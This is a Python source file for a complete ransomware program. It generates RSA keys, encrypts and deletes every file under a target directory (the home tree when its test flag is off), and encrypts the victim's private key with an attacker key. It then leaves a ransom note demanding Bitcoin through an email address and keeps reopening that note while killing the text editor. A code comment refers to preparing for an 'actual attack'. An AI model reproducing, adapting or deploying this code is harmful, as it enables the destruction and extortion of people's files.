import base64
import datetime
import os
import subprocess
import threading
import time

from cryptography.hazmat.backends import default_backend as crypto_default_backend
from cryptography.hazmat.primitives import hashes as crypto_hashes
from cryptography.hazmat.primitives import serialization as crypto_serialization
from cryptography.hazmat.primitives.asymmetric import padding as crypto_padding
from cryptography.hazmat.primitives.asymmetric import rsa


class Ransomware:
    def __init__(self):
        self.UnlockKey = None
        self.pubkey_pem = None
        self.privkey_pem = None
        self.attacker_public_key = None
        self.sysRoot = os.path.expanduser('~')
        self.testflag = True
        if self.testflag:
            self.attackroot = self.sysRoot + "/Documents/testFiles"
        else:
            self.attackroot = "/home"

    def generate_asy_keys(self):
        private_key = rsa.generate_private_key(
            backend=crypto_default_backend(),
            public_exponent=65537,
            key_size=2048
        )
        self.pubkey_pem = private_key.public_key().public_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PublicFormat.SubjectPublicKeyInfo
        )
        self.privkey_pem = private_key.private_bytes(
            crypto_serialization.Encoding.PEM,
            crypto_serialization.PrivateFormat.PKCS8,
            crypto_serialization.NoEncryption())

    # Writes clients both keys to the disk. Delete private key section before actual attack.
    def write_keys(self):
        if self.testflag:
            with open('client_private_key.pem', 'wb') as f1:
                f1.write(self.privkey_pem)
        with open('client_public_key.pem', 'wb') as f2:
            f2.write(self.pubkey_pem)

    def enc_private_key(self):
        with open("./public.pem", "rb") as key_file:
            self.attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                                backend=crypto_default_backend())
        enc_blob = encrypt_blob(self.privkey_pem, self.attacker_public_key)
        with open(self.sysRoot + "/Desktop/Email_Me_After_Paying.pemcry", "wb") as fa:
            fa.write(enc_blob)
        self.privkey_pem = None

    def encrypt_system(self):
        arr = os.walk(self.attackroot, topdown=True)
        for root, directory, files in arr:
            for file in files:
                if not (file.endswith("cry")):
                    file_path = os.path.join(root, file)
                    enc_file_blob = encrypt_file(file_path)
                    os.remove(file_path)
                    file_path = file_path + "cry"
                    print(file_path)
                    with open(file_path, 'wb') as fp:
                        fp.write(enc_file_blob)

    def decrypt_system(self):
        print("Decrypt thread")
        while True:
            try:
                print('waiting for unlock file')
                with open(f'{self.sysRoot}/Desktop/PUT_ON_DESKTOP.pem', 'r') as f:
                    self.UnlockKey = f.read()
                    arr = os.walk(self.attackroot, topdown=True)
                    for root, directory, files in arr:
                        for file in files:
                            if file.endswith("cry"):
                                file_path = os.path.join(root, file)
                                dec_file_path = decrypt_file(file_path, "PUT_ON_DESKTOP.pem")
                                print(dec_file_path)
                    break
            except Exception as e:
                print(e)
                pass
            time.sleep(10)

    def ransom_note(self):
        date = datetime.date.today().strftime('%d-%B-Y')
        with open(self.sysRoot + "/Desktop/RANSOM_NOTE.txt", 'w') as f:
            f.write(f'''
    The hard disk of your computer have been encrypted with RSA-2048 encryption.
    Its impossible to restore your data without a special key.
    Only we can decrypt your files!
    To purchase your key and restore your data, please follow these three easy steps:
    1. Email the file at {self.sysRoot}/Desktop/Email_Me_After_Paying.txt to GetYourFilesBack@protonmail.com
    2. You will receive your personal BTC address for payment.
    Once payment has been completed, send another email to GetYourFilesBack@protonmail.com stating "PAID".
    We will check to see if payment has been paid.
    3. You will receive a text file with your KEY that will unlock all your files. 
    4. Use this key provided along with the decryption software to get your files back.
    WARNING:
    Do NOT change file names, mess with the files, or run decryption software as there is a high chance you will lose your files forever.
    ''')
        # subprocess.run(['open', self.sysRoot + "/Desktop/RANSOM_NOTE.txt"], check=True)

    def show_ransom_note(self):
        # Open the ransom note
        ransom = subprocess.call(('xdg-open', self.sysRoot + "/Desktop/RANSOM_NOTE.txt"))
        count = 0  # Debugging/Testing
        while True:
            time.sleep(10)
            subprocess.Popen("killall gedit", shell=True)
            # Open the ransom note
            time.sleep(0.1)
            ransom = subprocess.call(('xdg-open', self.sysRoot + "/Desktop/RANSOM_NOTE.txt"))
            count += 1
            if count == 5:
                break


def decrypt_file(filepath, private_key_path):
    f = open(filepath, 'rb')
    fileblob = f.read()
    f.close()
    if filepath.endswith("cry"):
        dec_blob = decrypt_blob(fileblob, private_key_path)
        os.remove(filepath)
        filepath = filepath[:-3]
        with open(filepath, 'wb') as outf:
            outf.write(dec_blob)
    return filepath


def decrypt_blob(encryptedblob, private_key_path):
    encryptedblob = base64.b64decode(encryptedblob)
    chunk_size = 256
    offset = 0
    decrypted = b""
    with open(private_key_path, "rb") as key_file:
        attacker_private_key = crypto_serialization.load_pem_private_key(key_file.read(), password=None,
                                                                         backend=crypto_default_backend())
    while offset < len(encryptedblob):
        chunk = encryptedblob[offset: offset + chunk_size]
        decrypted += attacker_private_key.decrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        offset += chunk_size
    # print(decrypted)
    return decrypted


def encrypt_file(filepath):
    with open("./client_public_key.pem", "rb") as key_file:
        attacker_public_key = crypto_serialization.load_pem_public_key(key_file.read(),
                                                                       backend=crypto_default_backend())
    with open(filepath, 'rb') as f:
        fileblob = f.read()
    enc_blob = encrypt_blob(fileblob, attacker_public_key)
    return enc_blob


def encrypt_blob(fileblob, public_key):
    chunk_size = 190
    offset = 0
    end_loop = False
    encrypted = b""
    while not end_loop:
        chunk = fileblob[offset: offset + chunk_size]
        if len(chunk) % chunk_size != 0:
            end_loop = True
            chunk += b" " * (chunk_size - len(chunk))
        # print(chunk)
        enc_chunk = public_key.encrypt(chunk, crypto_padding.OAEP(
            mgf=crypto_padding.MGF1(
                algorithm=crypto_hashes.SHA256()),
            algorithm=crypto_hashes.SHA256(),
            label=None
        ))
        encrypted += enc_chunk
        offset += chunk_size
    encrypted_blob = base64.b64encode(encrypted)
    return encrypted_blob


def main():
    foo = Ransomware()
    foo.generate_asy_keys()
    foo.write_keys()
    foo.enc_private_key()
    foo.encrypt_system()
    foo.ransom_note()
    foo.show_ransom_note()
    # foo.decrypt_system()
    t1 = threading.Thread(target=foo.show_ransom_note)
    t2 = threading.Thread(target=foo.decrypt_system)
    t1.start()
    t2.start()


if __name__ == '__main__':
    main()
